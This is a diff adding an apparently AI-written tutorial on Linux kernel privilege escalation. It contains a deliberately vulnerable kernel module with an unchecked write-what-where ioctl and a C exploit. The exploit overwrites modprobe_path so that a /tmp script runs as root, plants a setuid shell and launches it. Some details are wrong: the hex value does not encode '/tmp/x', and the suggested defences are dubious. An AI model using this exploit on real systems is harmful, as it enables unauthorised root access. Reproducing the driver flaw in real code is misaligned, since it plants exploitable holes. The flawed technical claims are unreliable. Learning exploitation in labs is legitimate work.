@@ -1,1 +1,140 @@
+Kernel PWN / Half-Kernel Boxes bridge the gap between traditional user-space exploitation and full kernel exploitation. In a typical "half-kernel" scenario, you are not writing a raw exploitative C binary from scratch to overwrite core kernel threads. Instead, you are dealing with a setup where user-space binaries or specialized system services interact closely with custom hardware drivers or virtual device nodes (like /dev/something).
+The objective remains the same: execute an exploit from an unprivileged context (uid=1000) that triggers a memory or logical vulnerability inside the kernel layer to escalate privileges to root (uid=0).
+The most common attack vectors in this domain center around ioctl (Input/Output Control) handling loops, where custom parameters passed from user-land trigger an out-of-bounds read or write inside the driver's execution window.
+
+1. Understanding ioctl Communication
+
+Unlike standard files, device nodes rely on the ioctl(int fd, unsigned long request, ...) system call to pass complex, structured data blocks directly to a kernel extension or driver module.
+A vulnerability arises when the kernel driver copies a data structure from user space without rigorously validating the sizes, boundaries, or structural alignment of the incoming fields.
+
+2. The Vulnerable Kernel Driver Module (half_kernel.c)
+
+This snippet represents a custom Linux Kernel Module (.ko) exposing an ioctl entry point. It features full kernel mitigations (SMEP, SMAP, and KASLR are on), but introduces a critical Type Confusion / Arbitrary Write flaw inside its command handling logic.
+c
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/fs.h>
+#include <linux/uaccess.h>
+
+#define DEVICE_NAME "half_kernel_dev"
+#define IOCTL_CMD_WRITE_MEM 0x1337
+
+// Structure passed from user space into kernel space
+struct ioctl_arguments {
+    unsigned long *target_address; // WHERE to write
+    unsigned long value;          // WHAT to write
+};
+
+static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
+    struct ioctl_arguments user_data;
+
+    switch(cmd) {
+        case IOCTL_CMD_WRITE_MEM:
+            // Safely fetch the structural argument block from user land
+            if (copy_from_user(&user_data, (struct ioctl_arguments __user *)arg, sizeof(user_data))) {
+                return -EFAULT;
+            }
+
+            // VULNERABILITY: Arbitrary Write (Write-What-Where) primitive in Kernel Space.
+            // The driver does not validate if target_address points inside safe user space 
+            // or critical kernel control memory blocks!
+            *user_data.target_address = user_data.value;
+            break;
+            
+        default:
+            return -EINVAL;
+    }
+    return 0;
+}
+
+static struct file_operations fops = {
+    .unlocked_ioctl = device_ioctl,
+};
+
+static int __init kernel_init(void) {
+    register_chrdev(150, DEVICE_NAME, &fops);
+    return 0;
+}
+
+module_init(kernel_init);
+Use code with caution.
+
+3. Exploitation Strategy: Modifying modprobe_path
+
+Since SMEP and SMAP block us from jumping directly to user-space code to run commit_creds(prepare_kernel_cred(0)), we leverage our arbitrary write to overwrite a global kernel configuration string: modprobe_path.
+
+The Modprobe Trick:
+
+modprobe_path is a globally exportable kernel variable that defaults to the string "/sbin/modprobe". When the Linux kernel encounters a file with an unrecognizable execution signature (like a dummy file beginning with \xff\xff\xff\xff), it automatically launches whatever binary is specified in modprobe_path with highest root privileges to try and load a matching driver.
+By using our ioctl bug to overwrite modprobe_path with the path to a script we control (e.g., "/tmp/x"), we can force the kernel to execute our script as root the moment we attempt to trigger the unreadable file execution loop.
+
+4. The C Exploit Script (half_kernel_exploit.c)
+
+This C exploit runs in user space, maps the kernel targets, triggers the ioctl vulnerability to replace modprobe_path, and captures root privilege execution flow.
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+
+#define IOCTL_CMD_WRITE_MEM 0x1337
+
+struct ioctl_arguments {
+    unsigned long *target_address;
+    unsigned long value;
+};
+
+int main() {
+    // 1. Locate modprobe_path address via /proc/kallsyms (Assume KASLR leak is solved)
+    // For demonstration, let's assume the current runtime address is:
+    unsigned long *modprobe_path_addr = (unsigned long *)0xffffffff81c2a420;
+
+    // 2. Prepare our malicious script inside a writable partition (/tmp)
+    system("echo '#!/bin/sh' > /tmp/x");
+    system("echo 'cp /bin/sh /tmp/root_sh && chmod +s /tmp/root_sh' >> /tmp/x");
+    system("chmod +x /tmp/x");
+
+    // 3. Open communication channel with the custom driver node
+    int fd = open("/dev/half_kernel_dev", O_RDONLY);
+    if (fd < 0) {
+        perror("[-] Device node inaccessible");
+        return -1;
+    }
+
+    // 4. Overwrite modprobe_path one 8-byte chunk at a time using our arbitrary write.
+    // We rewrite the string "/sbin/modprobe" to point to "/tmp/x"
+    struct ioctl_arguments payload;
+    payload.target_address = modprobe_path_addr;
+    payload.value = 0x00000000782f706d; // Hex representation of "/tmp/x\x00\x00" (Little-Endian)
+
+    printf("[*] Triggering ioctl memory override on modprobe_path...\n");
+    ioctl(fd, IOCTL_CMD_WRITE_MEM, &payload);
+    close(fd);
+
+    // 5. Trigger modprobe execution by attempting to run an invalid file signature
+    system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/unknown_trigger");
+    system("chmod +x /tmp/unknown_trigger");
+    
+    printf("[*] Executing dummy payload to force kernel sub-process callback...\n");
+    system("/tmp/unknown_trigger 2>/dev/null"); // Triggers kernel panic handling loop
+
+    // 6. Enter the newly spawned root shell
+    printf("[+] Checking privilege escalation status...\n");
+    if (access("/tmp/root_sh", F_OK) == 0) {
+        printf("[+] Success! Dropping into root shell context...\n");
+        system("/tmp/root_sh -p");
+    } else {
+        printf("[-] Exploit failed. String overwrite alignment mismatch.\n");
+    }
+
+    return 0;
+}
+Use code with caution.
+
+5. Defensive Architectural Rules for Device Drivers
+
+Securing driver endpoints requires strictly isolating hardware management APIs from blind memory parsing loops:
+• Incorporate copy_from_user Bounded Checks: Drivers must treat any memory address structure received from an untrusted application handle as an unverified offset. Implement explicit validations using access_ok() to ensure execution handles stay bound strictly within user-space boundaries.
+• Lock Global Core Paths: Modern Linux kernel security configurations provide options to solidify paths. Enabling settings like sysctl fs.protected_symlinks=1 or keeping critical configuration strings in strictly page-protected table segments prevents structural variables like modprobe_path or poweroff_cmd from being casually overwritten by single arbitrary writes.
 
